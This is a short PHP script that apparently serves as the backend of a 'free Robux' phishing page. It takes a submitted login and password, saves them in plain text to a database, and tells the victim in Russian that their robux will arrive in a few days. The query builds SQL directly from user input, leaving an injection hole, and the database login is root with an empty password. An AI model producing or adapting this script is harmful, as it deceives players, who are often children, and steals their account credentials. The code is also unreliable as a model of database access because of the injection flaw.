<?php
$connection = new PDO('mysql:host=localhost; dbname=users2; charset=utf8;', 'root', '');

if (isset($_POST['send'])) {
    $login = $_POST['login'];
    $password = $_POST['password'];
    if ($connection->query("INSERT INTO users (login, password) VALUES ('$login', '$password');")) {
        echo "Ваши robux придут в течении нескольких дней!";
    } else {
        echo "Ошибка, робобуксы не получены";
    }
}
